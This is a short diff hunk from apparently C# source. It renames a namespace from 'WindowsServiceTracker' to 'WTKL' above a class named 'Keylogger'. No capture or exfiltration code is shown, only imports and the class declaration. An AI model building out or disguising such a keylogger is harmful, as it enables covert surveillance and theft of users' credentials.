@@ -9,7 +9,7 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 
-namespace WindowsServiceTracker
+namespace WTKL
 {
     class Keylogger
     {
